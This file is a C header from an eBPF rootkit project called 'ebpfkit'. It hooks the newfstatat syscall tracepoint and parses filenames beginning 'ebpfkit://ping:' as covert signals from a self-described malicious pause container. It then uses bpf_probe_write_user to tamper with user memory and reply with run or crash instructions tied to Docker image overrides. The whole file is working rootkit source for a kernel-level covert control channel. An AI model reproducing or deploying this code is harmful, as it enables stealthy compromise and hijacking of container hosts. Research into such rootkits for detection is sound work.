/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _STAT_H_
#define _STAT_H_

struct ebpfkit_ping_t {
    char ping[128];
};

SEC("tracepoint/raw_syscalls/newfstatat")
int sys_enter_newfstatat(struct tracepoint_raw_syscalls_sys_enter_t *args) {
    u8 action = PING_NOP_CHR;
    char *filename;
    bpf_probe_read(&filename, sizeof(filename), &args->args[1]);

    // check if this is a ping from our malicious pause container
    struct ebpfkit_ping_t ping = {};
    bpf_probe_read_str(ping.ping, sizeof(ping.ping), filename);
    if (ping.ping[0] != 'e' ||
        ping.ping[1] != 'b' ||
        ping.ping[2] != 'p' ||
        ping.ping[3] != 'f' ||
        ping.ping[4] != 'k' ||
        ping.ping[5] != 'i' ||
        ping.ping[6] != 't' ||
        ping.ping[7] != ':' ||
        ping.ping[8] != '/' ||
        ping.ping[9] != '/') {
        return 0;
    }

    if (ping.ping[10] == 'p' &&
        ping.ping[11] == 'i' &&
        ping.ping[12] == 'n' &&
        ping.ping[13] == 'g' &&
        ping.ping[14] == ':') {

        struct image_override_key_t key = {};
        u32 len = bpf_probe_read_str(&key.image, DOCKER_IMAGE_LEN, &ping.ping[15]);
        key.prefix = len - 1;
        // bpf_printk("stat (%d): %s\n", key.prefix, key.image);

        struct image_override_t *img = bpf_map_lookup_elem(&image_override, &key);
        if (img == NULL) {
            return 0;
        }
        // bpf_printk("action: %d\n", img->ping);

        if (img->ping == PING_NOP) {
            return 0;
        } else if (img->ping == PING_RUN) {
            action = PING_RUN_CHR;
        } else if (img->ping == PING_CRASH) {
            action = PING_CRASH_CHR;
        }
        bpf_probe_write_user(filename, &action, 1);
        // bpf_printk("response: %s\n", filename);
    }

    return 0;
}

#endif